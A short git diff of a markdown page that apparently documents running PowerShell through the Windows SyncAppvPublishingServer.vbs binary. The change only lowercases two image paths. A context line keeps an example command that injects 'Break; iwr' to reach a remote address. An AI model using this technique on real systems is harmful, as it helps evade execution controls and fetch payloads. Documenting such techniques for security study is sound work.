@@ -22,9 +22,9 @@ Windows 10 comes with `SyncAppvPublishingServer.exe and` `SyncAppvPublishingServ
 SyncAppvPublishingServer.vbs "Break; iwr http://10.0.0.5:443"
 ```
 
-![](../../.gitbook/assets/pwshll-SyncAppvPublishingServer.png)
+![](../../.gitbook/assets/pwshll-syncappvpublishingserver.png)
 
-![](../../.gitbook/assets/pwshll-SyncAppvPublishingServer.gif)
+![](../../.gitbook/assets/pwshll-syncappvpublishingserver.gif)
 
 ## References
 
